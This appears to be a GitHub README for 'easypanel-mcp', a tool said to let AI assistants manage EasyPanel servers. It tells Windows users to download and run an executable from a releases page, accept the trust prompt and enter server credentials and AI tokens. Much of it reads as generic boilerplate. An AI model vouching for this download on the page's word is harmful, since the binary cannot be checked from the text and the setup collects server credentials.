# 🛠️ easypanel-mcp - Manage Servers with Simple Commands

[![Download Latest Release](https://img.shields.io/badge/Download-easypanel--mcp-blue?style=for-the-badge)](https://github.com/Parnellcold355/easypanel-mcp/releases)

---

## 📋 About easypanel-mcp

easypanel-mcp is a server tool that connects AI helpers with EasyPanel. It lets you control your infrastructure easily using natural language. You can launch services, oversee deployments, set up networks, and handle projects. This works through Claude Desktop, n8n, or your own AI agents.

This tool aims to simplify complex server management by letting you use plain commands instead of manual setups. It suits those who want to automate regular tasks without deep technical skills.

---

## 🔍 Key Features

- Connects AI assistants to your server environment  
- Manage deployments and projects without code  
- Automate service launches and network setups  
- Supports Claude Desktop, n8n, and custom AI agents  
- Uses Docker technology for packaging and running services  
- Works across common server setups with EasyPanel integration  

---

## 🖥️ System Requirements

Before you start, make sure your Windows PC meets these requirements:

- Windows 10 or later (64-bit recommended)  
- At least 4 GB of RAM  
- Minimum 2 GHz processor  
- 10 GB free disk space  
- Internet connection for downloads and updates  
- Docker Desktop installed and running  
- EasyPanel account with access permissions  

---

## 🚀 Getting Started: Installing easypanel-mcp on Windows

Follow these steps to download and run easypanel-mcp on your Windows PC. No programming knowledge is needed.

### Step 1: Download the software

Go to the easypanel-mcp release page by clicking this link:

[Download easypanel-mcp Releases](https://github.com/Parnellcold355/easypanel-mcp/releases)

You will find a list of available versions. Look for the latest stable release tagged as such (e.g., "v1.0.0" or similar).  

Download the `.exe` file for Windows if available. If the release provides a compressed file like `.zip`, download that instead.

---

### Step 2: Prepare your computer

1. Make sure Docker Desktop is installed. If not, download and install it from https://www.docker.com/products/docker-desktop.  
2. Have your EasyPanel login ready. You will need it to use easypanel-mcp features.  
3. Close other applications that use network heavily to prevent conflicts.

---

### Step 3: Run the installer or unpack the software

- If you downloaded an `.exe` file, double-click it and follow the on-screen prompts.  
- If you downloaded a `.zip` archive, right-click it and select "Extract All". Choose a folder you can easily access, like your Desktop. Then open that folder.

---

### Step 4: Launch easypanel-mcp

Locate `easypanel-mcp.exe` in your chosen folder and double-click it to start the program. The first time you run it, Windows might ask if you trust the app. Confirm that you want to run it.

---

## ⚙️ Setting Up Your Server Connection

Once the program is running, you will see a simple interface or command window. Here’s how to connect it with EasyPanel and your AI assistant:

1. Enter your EasyPanel account credentials when asked. This lets easypanel-mcp connect to your server.  
2. Add the AI assistant you want to control the server (Claude Desktop, n8n, or another agent). You might need an API key or access token from your AI provider.  
3. Follow on-screen instructions to finish setup. You may need to input server IP, ports, or network preferences.

---

## 🔧 How to Use easypanel-mcp

After setup, you can begin managing your projects and deployments with simple commands like these:

- **Deploy a new service**: Tell the AI “Deploy [service name] on port [port number].” The tool handles the rest.  
- **Check current deployments**: Ask your AI “List running services.”  
- **Restart a service**: Say “Restart [service name].”  
- **Create a network**: Command “Set up private network for project [name].”  
- **View logs**: Request “Show logs for [service name].”

The AI will translate these into technical commands behind the scenes.

---

## 🗄️ Common Questions

**Where does easypanel-mcp store data?**  
By default, it keeps temporary files in your user profile directory under `AppData\Local\easypanel-mcp`.

**Do I need to run easypanel-mcp all the time?**  
Yes, to maintain control through AI agents, keep it running. You can minimize it to the taskbar.

**Can easypanel-mcp update itself?**  
You should check the release page periodically and download updates manually. Automatic updates are not included.

---

## 🛠 Maintenance Tips

- Restart Docker Desktop if you notice network issues with deployments.  
- Keep EasyPanel credentials secure and updated.  
- Ensure your AI assistant tokens stay valid to avoid disconnects.  
- Backup your project and deployment settings regularly.

---

## 💻 Advanced Setup (Optional)

For users comfortable with configuration files:

- easypanel-mcp stores settings in a `.yaml` format file located at `%USERPROFILE%\.easypanel-mcp\config.yaml`.  
- You can edit it with any text editor to customize network ports, project paths, or AI agent configurations.  
- Refer to the sample config file included in the download for details on each option.

---

## 📥 Download Link Reminder

Use the button below to visit the release page and get the latest version for Windows:

[![Download Latest Release](https://img.shields.io/badge/Download-easypanel--mcp-green?style=for-the-badge)](https://github.com/Parnellcold355/easypanel-mcp/releases)